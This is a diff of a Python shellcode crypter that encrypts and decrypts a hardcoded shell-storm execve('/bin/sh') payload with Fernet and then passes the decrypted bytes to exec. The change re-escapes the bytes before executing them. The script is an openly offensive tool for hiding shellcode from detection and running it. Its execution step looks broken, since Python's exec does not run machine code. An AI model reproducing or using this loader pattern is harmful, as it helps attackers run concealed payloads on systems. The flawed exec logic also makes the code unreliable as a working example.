@@ -2,6 +2,7 @@
 from cryptography.fernet import Fernet
 from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
 import sys
+import binascii
 
 # http://shell-storm.org/shellcode/files/shellcode-575.php
 shellcode = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
@@ -41,8 +42,9 @@ if __name__ == "__main__":
         elif sys.argv[1] == "decrypt":
             ciphertext = bytes(sys.argv[2],'ascii')
             plaintext = decrypt(ciphertext)
-            print("Decrypted shellcode: ",str(plaintext)[2:-1])
-            exec(plaintext)
+            encoded = str(plaintext)[2:-1].replace('x','\\x')
+            print("Decrypted shellcode: ",encoded)
+            exec(encoded.encode())
             
 
         
